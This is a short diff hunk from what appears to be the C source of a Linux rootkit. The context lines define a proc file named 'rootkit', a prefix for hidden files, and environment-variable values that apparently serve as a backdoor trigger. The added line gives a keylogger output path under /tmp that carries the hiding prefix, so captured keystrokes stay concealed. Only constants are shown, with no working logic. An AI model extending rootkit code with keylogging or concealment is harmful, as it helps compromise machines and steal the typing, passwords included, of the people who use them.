@@ -14,6 +14,7 @@
 
 #define PROCFILE_NAME "rootkit"
 #define HIDE_PREFIX "rk_file_"
+#define KEYLOG_FILE "/tmp/rk_file_keylog"
 
 #define ENV_VAR "root"
 #define ENV_PASS "yes"
